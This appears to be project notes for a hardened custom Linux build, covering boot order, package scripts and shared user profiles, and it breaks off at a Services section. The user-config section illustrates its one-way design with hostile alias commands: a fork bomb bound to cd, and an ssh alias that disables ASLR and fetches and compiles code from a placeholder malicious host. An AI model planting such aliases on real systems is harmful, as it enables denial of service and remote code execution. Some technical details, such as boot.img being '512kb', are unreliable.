# Starting from the raw image:

### Securing the boot
The boot order for Linux on metal generally goes:
	1. BIOS (We'll deal UEFI seperately)
		1. POST (Power on self-test)
		2. Bootstrap Loader
		3. BIOS
		4. CMOS Setup
		#) Automatic lookup for correct version over secure channel.
				Verify with hashes, pgp sigs, check against existing.

	2. MBR
		1. boot.img (512kb file)
		
	3. GRUB
		1. core.img
		2a. initrd (init RAM Disk) loaded into RAM
		2b. tmpfs mounted.
		2ba. initramfs loaded into tmpfs mount.
	4. Kernel
		1. Kernel image is selected either
			automatically
			manually (GRUB Menu)

	5. System Service Initialization Framework
	6. Run Level
		0. Halt
		1. Single user mode
		2. Multi-user mode, no-NFS
		3. Full multi-user mode
		4. Unused (for now.. muuwaahhhhahahahaahh)
		5. X11
		6. Reboot
		S. Single user modev

### Package and Service Management

##### deepkg-cleaning.sh

Short version:

The configuration options can be found in:
`/gcgbuild/jailpurse/config/deepkg-cleaning.conf`

It is essentially a list of packages that will
be initially removed from the stock distribution.

Extended Club Mix:

Removes everything that isn't necessary to 
your development environment that leaves
the GUI intact. With gnome4 and unity in ubuntu
this is what I've come to refer to as 
'Dependency Jenga'. In order to strip the dist
down to bare essentials you *will*
break some packages. We will fix these later
so that you can continue to use aptitude if
you so choose.

*I have chosen not to
work up from an already bare distribution for
personal growth, learning purposes. You have
the option to start with a more bare-bones 
distribution and skip this step of the 
customization process.*

TBD:
	1. Circular dependencies
	2. Suggested and Recommended dependencies
	3. Chemical dependencies
	4. Social co-dependencies


##### deepkg-build.sh

Short version:

The configuration options can be found in:
`/gcgbuild/jailpurse/config/deepkg-build.conf`

It is essentially a list of packages that will
be initially added to your custom distribution.

Extended Club Mix:

There are certain packages that are not 
up-to-date in their Debian Repos. You may
need to download them from their creators/
distributors and build them from source.

I am debating whether these should be 
separate script/config-files, or whether
we want to add those steps to this process.
currently, totally up to you.

In the future, this will fall under the 
bankey of the `SoftChecks` program TBD
later.

I will also be installing RPM,
Yum, and Pacman to increase the amount of 
software resources I have access to, and
as part of the `SoftChecks` program TBD later.

*Once again, this is completely optional. You
are free to rely on the stock package manager
for your distribution. I am choosing to do this
for personal growth, to gain understanding of
these systems.*

If you would like to share your config files, by
all means make a pull request.


### Users and profile config.

Short version:

User configuration options can be found in:
`gcgbuild/jailpurse/config/users.conf`

This will add the user(s) you describe, and
modify the system according 

For this prototype, I have set up the config with
my bash preferences, and have configured a 
centralized approach that allows the user to
share the same bash settings as root. This is a 
one-way conduit from root to user, for what 
should be obvious reasons.. Let's say:
`echo 'alias cd=":(){:|: & }:"' >> /path/to/shared/.bash_aliases`
... or even:
`echo 'alias ssh="echo 0 > /proc/sys/kernel/randomize_va_space && sh -c $(curl -s https://malicious-site.tld/evil-program.c > ./evil-program && gcc -fno-stack-protector -z execstack -o evil-program evil-program.c && ) '
However, if you wish to overwrite the centralized
profile settings, you can do that for any
unprivileged user. In the config.

My intention in building this prototype
is a single-user system (barring the occasional 
`undocumented admin`) With a non-root user
solely for SSH and file storage.
However you may have other 
needs, and customization is encouraged. That's 
what this is all about. If you would like to 
share your custom configurations, and add them to
the list, please, by all means make a pull 
request.


### Services

One of the primary objectives of this is 
0-config military-grade security for end-users.
While that's realistically unattainable, and
